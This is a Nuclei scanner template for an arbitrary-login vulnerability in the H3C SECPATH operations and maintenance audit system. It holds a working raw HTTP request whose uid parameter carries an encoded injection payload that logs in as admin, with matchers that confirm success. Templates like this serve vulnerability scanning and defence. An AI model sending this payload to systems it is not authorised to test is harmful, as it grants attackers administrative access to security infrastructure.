id: h3c-secpath-arbitrary-login
info:
  name: H3C SECPATH Operations and Maintenance Audit System Arbitrary Login
  author: ProjectDiscoveryAI
  severity: high
  description: |
    H3C SECPATH Operations and Maintenance Audit System is vulnerable to arbitrary user login, allowing attackers to log in with crafted requests.
  tags: permission-bypass
  reference:
    - https://gobies.org/
http:
  - raw:
      - |
        GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "错误的id"
